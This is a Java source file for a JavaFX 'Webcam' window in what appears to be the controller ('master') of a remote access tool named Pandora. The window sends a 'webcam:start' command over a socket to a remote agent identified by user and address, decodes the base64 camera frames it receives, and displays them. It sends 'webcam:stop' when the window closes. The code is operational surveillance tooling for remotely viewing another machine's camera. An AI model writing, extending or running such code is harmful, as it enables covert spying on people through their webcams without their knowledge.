package org.pandora.master.scene.impl.agent;


import javafx.embed.swing.SwingFXUtils;
import javafx.geometry.Insets;
import javafx.scene.Scene;
import javafx.scene.control.CheckBox;
import javafx.scene.control.Label;
import javafx.scene.image.ImageView;
import javafx.scene.layout.AnchorPane;
import javafx.scene.layout.Background;
import javafx.scene.layout.BackgroundFill;
import javafx.scene.layout.CornerRadii;
import javafx.scene.paint.Color;
import javafx.scene.shape.Line;
import javafx.stage.WindowEvent;
import lombok.Getter;
import org.pandora.master.Master;
import org.pandora.master.builder.BuilderManager;
import org.pandora.master.builder.impl.scene.ControllerBuilder;
import org.pandora.master.data.agent.AgentData;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.util.Base64;

public class Webcam {

    private final AnchorPane anchorPane;
    private final BuilderManager builderManager;
    @Getter
    private final AgentData agentData;
    private final Scene scene;
    private final Master master;
    private final ControllerBuilder controllerBuilder;
    private final ImageView camera;
    private final Label infoLabel;
    private final CheckBox checkBox;

    public Webcam(final ControllerBuilder controllerBuilder) {
        this.controllerBuilder = controllerBuilder;
        this.master = controllerBuilder.getMaster();
        this.anchorPane = controllerBuilder.getAnchorPane();
        this.builderManager = controllerBuilder.getBuilderManager();
        this.agentData = controllerBuilder.getAgentData();
        this.scene = controllerBuilder.getScene();
        this.camera = new ImageView();
        this.infoLabel = this.builderManager.getLabelBuilder().buildLabel("Searching for image...", 118, 252, Color.rgb(230, 230, 230), "Verdana", 16);
        this.checkBox = this.builderManager.getCheckBoxBuilder().buildCheckBox(5, 480);
    }

    public void open() {
        this.master.getStageManager().getScenes().put(this.controllerBuilder, this);
        this.anchorPane.setBackground(new Background(new BackgroundFill(Color.rgb(26, 27, 36), CornerRadii.EMPTY, Insets.EMPTY)));

        final Label defaultLabel = this.builderManager.getLabelBuilder().buildLabel("Webcam | " + this.agentData.getUser() + "@" + this.agentData.getAddress(), 15, 20, Color.rgb(230, 230, 230), "Consolas", 17);
        final Line line = this.builderManager.getBasicLineBuilder().buildSimpleLine(Color.WHITE, 20, 54, 395, 54);
        final Label checkBoxLabel = this.builderManager.getLabelBuilder().buildLabel("Toggle Fullscreen", 29, 483, Color.rgb(230, 230, 230), "Consolas", 12);

        this.camera.setX(0);
        this.camera.setY(60);
        this.camera.prefHeight(415);
        this.camera.prefWidth(415);

        this.checkBox.setSelected(true);
        this.checkBox.setId("agent-webcam-checkBox");

        this.sendRequest();

        this.scene.getWindow().addEventFilter(WindowEvent.WINDOW_CLOSE_REQUEST, this::close);
        this.anchorPane.getChildren().addAll(this.camera, defaultLabel, line, this.infoLabel, checkBoxLabel, this.checkBox);
    }

    private void sendRequest() {
        this.master.getSocketUtils().write(this.agentData.getId(), "webcam:start");
    }

    public void receiveRequest(final String agentId, final String response) {
        if (!this.agentData.getId().equals(agentId)) return;
        if (response.equals("No camera")) {
            this.infoLabel.setText("No camera");
            this.infoLabel.setTranslateX(164);
        } else {
            try {
                this.infoLabel.setText("");
                final byte[] buffer = Base64.getDecoder().decode(response);
                final ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(buffer);
                final BufferedImage bufferedImage = this.checkBox.isSelected() ? this.resize(ImageIO.read(byteArrayInputStream), 415, 415) : ImageIO.read(byteArrayInputStream);
                this.camera.setImage(SwingFXUtils.toFXImage(bufferedImage, null));
            } catch (final IOException e) {
                e.printStackTrace();
            }
        }
    }

    private BufferedImage resize(final BufferedImage img, final int newW, final int newH) {
        final java.awt.Image tmp = img.getScaledInstance(newW, newH, java.awt.Image.SCALE_SMOOTH);
        final BufferedImage bufferedImage = new BufferedImage(newW, newH, BufferedImage.TYPE_INT_ARGB);
        final Graphics2D g2d = bufferedImage.createGraphics();
        g2d.drawImage(tmp, 0, 0, null);
        g2d.dispose();
        return bufferedImage;
    }

    private void close(final WindowEvent event) {
        this.master.getSocketUtils().write(this.agentData.getId(), "webcam:stop");
    }
}
